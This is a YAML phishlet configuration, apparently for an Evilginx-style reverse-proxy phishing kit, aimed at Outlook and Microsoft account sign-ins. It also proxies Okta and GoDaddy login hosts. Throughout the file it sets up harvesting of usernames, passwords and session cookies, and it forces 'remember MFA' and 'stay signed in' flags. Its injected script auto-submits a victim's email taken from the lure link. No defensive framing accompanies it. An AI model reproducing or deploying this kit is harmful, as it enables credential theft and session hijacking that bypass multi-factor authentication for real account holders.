name: 'Outlook'
author: '@simplerhacking'
min_ver: '3.0.0'
proxy_hosts:
  - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "www", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "acc", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "live", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "account", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "outlook", orig_sub: "outlook", domain: "live.com", session: true, is_landing: true, auto_filter: false }
  - { phish_sub: 'gui', orig_sub: 'gui', domain: 'godaddy.com', session: true, is_landing:false,  auto_filter: false }
  - { phish_sub: 'csp', orig_sub: 'csp', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: false }
  - { phish_sub: 'reporting', orig_sub: 'reporting', domain: 'cdndex.io', session: false, is_landing:false, auto_filter: false }
  - { phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: false }
  - { phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: false }
  - { phish_sub: 'events.api', orig_sub: 'events.api', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: false }
  - { phish_sub: 'apm.vpce.gdw55e', orig_sub: '55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e', domain: 'elastic-cloud.com', session: true, is_landing: false, auto_filter: false }
  - {phish_sub: 'g.sst', orig_sub: 'g.sst', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: false }
  - {phish_sub: 'ssl', orig_sub: 'compass-ssl', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "ok", orig_sub: "", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "okta", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: false }

sub_filters:
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'live', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'storage', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'storage', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'www', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'www', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'login', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'outlook', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'storage', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'storage', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'www', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'www', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'login', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'outlook', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'storage', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'storage', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'www', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'www', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'logincdn', domain: 'msauth.net', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "sso.godaddy.com", orig_sub: "csp", domain: "godaddy.com", search: "https://{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "sso.godaddy.com", orig_sub: "csp", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript], redirect_only: true}
  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https%3A%2F%2F{hostname}", replace: "https%3A%2F%2F{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "gui.godaddy.com", orig_sub: "gui", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "gui.godaddy.com", orig_sub: "gui", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "csp.godaddy.com", orig_sub: "csp", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "reporting.cdndex.io", orig_sub: "reporting", domain: "cdndex.io", search: "https://{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "reporting.cdndex.io", orig_sub: "reporting", domain: "cdndex.io", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e.elastic-cloud.com", orig_sub: "55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e", domain: "elastic-cloud.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e.elastic-cloud.com", orig_sub: "55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e", domain: "elastic-cloud.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  ##
  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - { triggers_on: 'csp.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'csp.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - { triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - { triggers_on: 'gui.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'href="https://{hostname}}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'gui.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - { triggers_on: 'reporting.cdndex.io', orig_sub: 'reporting', domain: 'cdndex.io', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'reporting.cdndex.io', orig_sub: 'reporting', domain: 'cdndex.io', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - { triggers_on: 'g.sst.godaddy.com', orig_sub: 'g.sst', domain: 'godaddy.con', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'g.sst.godaddy.com', orig_sub: 'g.sst', domain: 'godaddy.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'g.sst.godaddy.com', orig_sub: 'g.sst', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - { triggers_on: '55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e.elastic-cloud.com', orig_sub: '55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e', domain: 'elastic-cloud.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: '55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e.elastic-cloud.com', orig_sub: '55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e', domain: 'elastic-cloud.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript], redirect_only: true }
  - { triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - { triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - { triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - { triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
auth_tokens:
  - domain: 'login.live.com'
    keys: ['uaid','MSPRequ','MSCC','MSPOK','__Host-MSAAUTHP','MSPPre','MSPCID','MSPAuth','MSPProf','NAP','ANON','WLSSC','SDIDC','JSHP','JSH','MSPSoftVis','OParams','MSPBack', '.*,regexp']
  - domain: 'live.com'
    keys: ['ai_session','wlidperf','PPLState','WLSSC','RPSSecAuth','MSPCID','MSPAuth','MSPProf','NAP','ANON','.*,regexp']
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH','ESTSAUTHPERSISTENT','SignInStateCookie','esctx','ESTSSC','ESTSAUTHLIGHT','stsservicecookie','x-ms-gateway-slice', '.*,regexp']
  - domain: 'login.microsoftonline.com'
    keys: ['ESTSSC','ESTSAUTHLIGHT','stsservicecookie','x-ms-gateway-slice', '.*,regexp']
  - domain: 'outlook.live.com'
    keys: ['DefaultAnchorMailbox', 'UC', 'OutlookSession', 'X-OWA-CANARY', '.*,regexp']   
force_post:
  - path: "/ppsecure/post*"
    search:
      - { key: "LoginOptions", search: "1" }
    force:
      - { key: "DontShowAgain", value: "true" }
    type: "post"
  - path: '/kmsi'
    search: 
      - {key: 'LoginOptions', search: '.*'}
    force:
      - {key: 'LoginOptions', value: '1'}
    type: 'post'
  - path: '/common/SAS'
    search: 
      - {key: 'rememberMFA', search: '.*'}
    force:
      - {key: 'rememberMFA', value: 'true'}
    type: 'post'
auth_urls:
  - "/mail/inbox"
  - "/mail/0"
  - "/mail/1"
  - "/mail/2"
  - "/mail/3"
  - "/mail/4"
credentials:
  username:
    key: ""
    search: '"username":"([^"]*)'
    type: "json"
  password:
    key: ""
    search: '"password":"([^"]*)'
    type: "json"
  username:
    key: (login|UserName|username|email|account)
    search: (.*)
  password:
    key: (passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)
    search: (.*)
  username:
    key: '(login)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(passwd)'
    search: '(.*)'
    type: 'post'
login:
  domain: 'outlook.live.com'
  path: '/owa/?nlp=1'
# Auto fill email. Use by appending #{email} to lure link e.g. https://phish.com/lure#example@gmail.com
js_inject:
  - trigger_domains: ["login.live.com"]
    trigger_paths: ["/*"]
    script: |
      window.addEventListener("load", () => {
        if (window.location.hash.length == 0) {
          return
        }
        function waitForElm(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));const r=new MutationObserver(o=>{document.querySelector(e)&&(t(document.querySelector(e)),r.disconnect())});r.observe(document.body,{childList:!0,subtree:!0})})}
        waitForElm("#i0116").then((elm) => {
          elm.focus();
          elm.value = window.location.hash.slice(1);
          const submBtn = document.querySelector("#idSIButton9");
          submBtn.focus();
          submBtn.click();
        });
      });
